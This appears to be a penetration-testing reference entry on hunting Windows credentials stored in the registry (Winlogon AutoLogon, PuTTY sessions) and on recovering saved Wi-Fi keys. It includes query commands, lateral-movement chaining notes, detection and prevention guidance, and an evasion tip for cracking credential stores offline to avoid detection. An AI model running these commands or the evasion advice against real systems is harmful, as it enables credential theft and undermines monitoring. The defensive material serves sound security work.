notes:
=== Registry Stored Credentials ===
Windows Autologon and PuTTY sessions store credentials in plaintext registry keys.

=== WINDOWS AUTOLOGON ===
Location: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
Values: DefaultUserName, DefaultPassword, DefaultDomainName
Access: readable by standard users (BUILTIN\Users has read access)

Query:
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select DefaultUserName,DefaultPassword

Note: Sysinternals Autologon.exe encrypts the password as an LSA secret (more secure alternative).
If DefaultPassword value exists and is not empty → immediately usable credential.

=== PUTTY SESSIONS ===
Location: HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\<session_name>
Values: ProxyUsername, ProxyPassword
Access: limited to owning user's HKCU, but readable from HKEY_USERS\<SID>\... with admin rights

Query:
  reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions" /s
  reg query "HKU\" (list all user SIDs), then query each user's PuTTY sessions

=== WIFI PASSWORDS ===
  netsh wlan show profile   → list all saved wireless profiles
  netsh wlan show profile <name> key=clear   → show PSK in cleartext under "Key Content"
  Requires local admin rights

=== LOLBAS REGISTRY SEARCH ===
  reg query HKLM /f password /t REG_SZ /s   (search all HKLM for "password" string — slow but thorough)
  reg query HKCU /f password /t REG_SZ /s

=== CHAINING CONTEXT ===
Autologon credentials → domain credentials on workstations joined to domain → lateral movement
Autologon often set on kiosks, shared workstations, or servers with automated startup scripts
PuTTY proxy credentials → SOCKS/HTTP proxy server credentials → network pivot
Sweep all HKEY_USERS profiles after gaining local admin → all users' PuTTY sessions

=== WHAT TO LOOK FOR ===
DefaultPassword value present in Winlogon = plaintext credential immediately usable
Multiple user SIDs in HKEY_USERS = multiple potential PuTTY credential stores to check
netsh wifi check on any domain-connected workstation = may reveal pre-shared keys for wireless segments

recommended.note: Which Winlogon values hold the password.

name: Credential Hunting - Registry & Wi-Fi Secrets
description: Common secret stashes: Winlogon AutoLogon (DefaultPassword), PuTTY saved sessions (proxy creds), and saved wireless profiles (recoverable in cleartext).

variations.label: Wi-Fi passwords
variations.command:
netsh wlan show profile
netsh wlan show profile <SSID> key=clear

defense.why_it_works: Windows AutoLogon stores credentials in plaintext (or weakly encrypted) in the registry under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon. PuTTY stored sessions under HKCU can contain proxy credentials. Any user who can read these registry keys recovers those stored credentials.
defense.prerequisites: Shell access. Read access to HKLM\...\Winlogon (usually accessible to all users). HKCU registry access for PuTTY sessions (owner access).
defense.impact: Discovery of AutoLogon account credentials (often administrator) from the Winlogon registry hive, enabling privilege escalation or lateral movement.
defense.detection: reg query on Winlogon or PuTTY registry paths by non-admin. Process log: reg.exe query of DefaultPassword key. SIEM: alert on Winlogon credential registry read by standard user.
defense.artifacts: Process log: reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon | Registry audit: read on DefaultPassword value
defense.prevention: Disable AutoLogon in production environments — it is not appropriate for servers or shared workstations. If required, use a low-privilege account not linked to admin functions. Remove PuTTY saved credentials. Apply registry ACLs to restrict Winlogon key reads to SYSTEM only.
defense.misconfiguration: AutoLogon configured for convenience on a server with a local admin password stored in DefaultPassword. Registry ACL allows all users to read HKLM\...\Winlogon\DefaultPassword.
defense.vulnerable_config:
# Winlogon stores AutoLogon creds:
reg query 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
# DefaultUserName: Administrator
# DefaultPassword: P@ssw0rd2024!

# PuTTY session creds:
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
defense.secure_config:
# Disable AutoLogon
reg delete 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v DefaultPassword
reg delete 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v DefaultUserName
reg delete 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v AutoAdminLogon

# Restrict Winlogon registry ACL
# Only SYSTEM should read DefaultPassword
defense.evasion: Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools.
